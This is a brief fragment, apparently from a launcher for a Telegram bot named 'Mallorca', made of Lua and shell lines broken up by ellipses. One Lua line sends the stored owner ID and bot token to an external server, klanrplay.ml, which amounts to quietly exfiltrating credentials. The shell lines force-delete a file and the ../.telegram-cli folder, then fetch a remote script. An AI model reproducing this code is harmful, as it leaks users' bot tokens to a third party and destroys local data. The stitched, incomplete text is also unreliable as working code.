...
local t = json:decode(https.request('http://klanrplay.ml/api/angel.php?id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write")))
print("::Mallorca::")
...
rm -fr Mallorca.lua
wget "https://raw.githubusercontent.com/Mallorca-TEAM/Mallorca/master/Mallorca.lua"
while(true) do
rm -fr ../.telegram-cli
